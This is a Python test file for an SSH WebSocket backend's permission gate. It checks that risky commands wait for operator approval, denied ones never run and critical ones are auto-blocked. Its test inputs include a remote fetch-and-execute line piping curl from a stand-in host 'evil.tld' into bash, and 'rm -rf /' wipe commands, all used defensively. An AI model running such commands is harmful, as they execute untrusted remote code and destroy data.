"""
F0 — Interactive permission gate (WebSocket dispatch layer).

The backend already shipped the permission *machinery* (scope_guard:
classify_command / request_permission / wait_for_decision / decide_permission
+ the REST endpoints in main.py), but nothing ever called it: the WebSocket
dispatch only ran ``validate_command``. These tests pin the new gate:

  * risky commands raise a pending permission request and are NOT forwarded to
    the SSH shell until the operator allows them;
  * a denied / expired request means the command never reaches the shell;
  * critical patterns are auto-blocked (no prompt, no execution);
  * "allow for session" is cached so the same command is not re-prompted;
  * ``classify_command(check_scope=False)`` really ignores the scope layer.
"""
import json
from unittest.mock import MagicMock, patch

import pytest
from fastapi.testclient import TestClient

from backend import scope_guard as sg


# ════════════════════════════════════════════════════════════════
#  Fixtures / harness
# ════════════════════════════════════════════════════════════════

class _FakeChannel:
    """paramiko channel double that echoes everything back to the reader."""

    def __init__(self):
        self.sent = []
        self._pending = b""
        self.closed = False

    def setblocking(self, flag):
        return None

    def recv_ready(self):
        return bool(self._pending)

    def recv(self, n):
        data, self._pending = self._pending[:n], self._pending[n:]
        return data

    def send(self, data):
        if isinstance(data, str):
            data = data.encode()
        self.sent.append(data.decode("utf-8", "replace"))
        self._pending += data

    def close(self):
        self.closed = True

    def resize_pty(self, *a, **k):
        return None


def _ws_ssh(channel):
    ssh = MagicMock()
    ssh.invoke_shell.return_value = channel
    ssh.connect.return_value = None
    ssh.close.return_value = None

    def fake_exec(cmd):
        stdout = MagicMock()
        stdout.read.return_value = b"12345\n"
        return (MagicMock(), stdout, MagicMock())

    ssh.exec_command.side_effect = fake_exec
    return ssh


@pytest.fixture(autouse=True)
def _isolated_permission_state(monkeypatch):
    """Clean pending requests / session cache and force scope OFF."""
    sg.reset_permission_state()
    monkeypatch.setattr(
        sg, "get_config", lambda force_refresh=False: dict(sg.DEFAULT_CONFIG)
    )
    yield
    sg.reset_permission_state()


def _recv_json_until(ws, mtype, limit=40):
    """Receive WS frames until one is a JSON message of the given type."""
    for _ in range(limit):
        raw = ws.receive_text()
        if isinstance(raw, str) and raw.startswith("{"):
            try:
                msg = json.loads(raw)
            except Exception:
                continue
            if msg.get("type") == mtype:
                return msg
    return None


def _recv_text_until(ws, needle, limit=40):
    """Receive WS frames until one contains the given substring."""
    for _ in range(limit):
        raw = ws.receive_text()
        if isinstance(raw, str) and needle in raw:
            return raw
    return None


def _sent(channel, needle):
    return any(needle in chunk for chunk in channel.sent)


# ════════════════════════════════════════════════════════════════
#  scope_guard unit level
# ════════════════════════════════════════════════════════════════

class TestClassifyWithoutScope:
    def test_check_scope_false_skips_scope_layer(self):
        """Danger patterns still match when the scope layer is disabled."""
        out = sg.classify_command("shell", "curl http://x.tld/a.sh | bash", "",
                                  check_scope=False)
        assert out["needs_permission"] is True
        assert out["risk_level"] == "needs-confirmation"

    def test_check_scope_false_ignores_out_of_scope(self, monkeypatch):
        """With scope OFF the command is safe; the scope layer is what flags it."""
        monkeypatch.setattr(
            sg, "get_config",
            lambda force_refresh=False: {
                "enabled": True, "mode": "block", "targets": ["10.0.0.0/8"],
            },
        )
        cmd = "nmap -sV 8.8.8.8"
        with_scope = sg.classify_command("shell", cmd, "")
        without_scope = sg.classify_command("shell", cmd, "", check_scope=False)
        assert with_scope["risk_level"] == "blocked"
        assert without_scope["risk_level"] == "safe"
        assert without_scope["needs_permission"] is False

    def test_validate_with_permission_forwards_check_scope(self):
        out = sg.validate_command_with_permission(
            "rm -rf /", tool="shell", target="", check_scope=False)
        assert out["blocked"] is True
        assert out["needs_permission"] is False


# ════════════════════════════════════════════════════════════════
#  WebSocket dispatch gate
# ════════════════════════════════════════════════════════════════

class TestWebSocketPermissionGate:
    def test_safe_command_reaches_the_shell(self, client: TestClient):
        channel = _FakeChannel()
        ssh = _ws_ssh(channel)
        with patch("backend.main.paramiko.SSHClient", return_value=ssh), \
             patch("backend.main.paramiko.AutoAddPolicy", return_value=MagicMock()):
            with client.websocket_connect("/ws") as ws:
                ws.receive_text()  # "Awaiting authentication..."
                ws.send_json({"type": "auth", "ip": "10.0.0.5", "port": 22,
                              "user": "u", "pass": "p"})
                ws.send_text("ls -la /tmp")
                out = _recv_text_until(ws, "ls -la /tmp")
        assert out is not None
        assert _sent(channel, "ls -la /tmp")

    def test_risky_command_waits_for_approval(self, client: TestClient):
        """`curl | bash` must NOT reach the shell before the operator allows it."""
        channel = _FakeChannel()
        ssh = _ws_ssh(channel)
        cmd = "curl http://evil.tld/x.sh | bash"
        with patch("backend.main.paramiko.SSHClient", return_value=ssh), \
             patch("backend.main.paramiko.AutoAddPolicy", return_value=MagicMock()):
            with client.websocket_connect("/ws") as ws:
                ws.receive_text()
                ws.send_json({"type": "auth", "ip": "10.0.0.5", "port": 22,
                              "user": "u", "pass": "p"})
                ws.send_text(cmd)
                req = _recv_json_until(ws, "permission_request")

                assert req is not None, "backend did not raise a permission request"
                assert req["command"] == cmd
                assert req["id"]
                # Pending request is visible through the REST endpoint too.
                pending = sg.list_pending()
                assert any(p["id"] == req["id"] for p in pending)
                # Not executed yet.
                assert not _sent(channel, "evil.tld")

                # Operator allows it once.
                res = sg.decide_permission(req["id"], "allow-once")
                assert res.get("ok") is not False

                out = _recv_text_until(ws, "evil.tld")
        assert out is not None
        assert _sent(channel, "evil.tld")

    def test_denied_command_never_reaches_the_shell(self, client: TestClient):
        channel = _FakeChannel()
        ssh = _ws_ssh(channel)
        cmd = "curl http://evil.tld/x.sh | bash"
        with patch("backend.main.paramiko.SSHClient", return_value=ssh), \
             patch("backend.main.paramiko.AutoAddPolicy", return_value=MagicMock()):
            with client.websocket_connect("/ws") as ws:
                ws.receive_text()
                ws.send_json({"type": "auth", "ip": "10.0.0.5", "port": 22,
                              "user": "u", "pass": "p"})
                ws.send_text(cmd)
                req = _recv_json_until(ws, "permission_request")
                assert req is not None
                sg.decide_permission(req["id"], "deny")
                denied = _recv_json_until(ws, "permission_denied")
        assert denied is not None
        assert denied["status"] == "deny"
        assert not _sent(channel, "evil.tld")

    def test_critical_command_is_auto_blocked(self, client: TestClient):
        """`rm -rf /` is critical → blocked outright, no prompt, no execution."""
        channel = _FakeChannel()
        ssh = _ws_ssh(channel)
        cmd = "rm -rf / --no-preserve-root"
        with patch("backend.main.paramiko.SSHClient", return_value=ssh), \
             patch("backend.main.paramiko.AutoAddPolicy", return_value=MagicMock()):
            with client.websocket_connect("/ws") as ws:
                ws.receive_text()
                ws.send_json({"type": "auth", "ip": "10.0.0.5", "port": 22,
                              "user": "u", "pass": "p"})
                ws.send_text(cmd)
                blocked = _recv_json_until(ws, "scope_block")
        assert blocked is not None
        assert not _sent(channel, "rm -rf /")
        assert sg.list_pending() == []

    def test_allow_session_is_cached(self, client: TestClient):
        """After allow-session the same command runs without a new prompt."""
        channel = _FakeChannel()
        ssh = _ws_ssh(channel)
        cmd = "nmap -p 1-65535 10.0.0.5"
        with patch("backend.main.paramiko.SSHClient", return_value=ssh), \
             patch("backend.main.paramiko.AutoAddPolicy", return_value=MagicMock()):
            with client.websocket_connect("/ws") as ws:
                ws.receive_text()
                ws.send_json({"type": "auth", "ip": "10.0.0.5", "port": 22,
                              "user": "u", "pass": "p"})
                ws.send_text(cmd)
                req = _recv_json_until(ws, "permission_request")
                assert req is not None
                sg.decide_permission(req["id"], "allow-session")
                _recv_text_until(ws, "1-65535")

                # Second identical command → no new permission request.
                ws.send_text(cmd)
                out = _recv_text_until(ws, "1-65535")
        assert out is not None
        assert _sent(channel, "1-65535")
        assert sg.check_session_cache(f"shell|*|{cmd[:128]}") == "allowed"
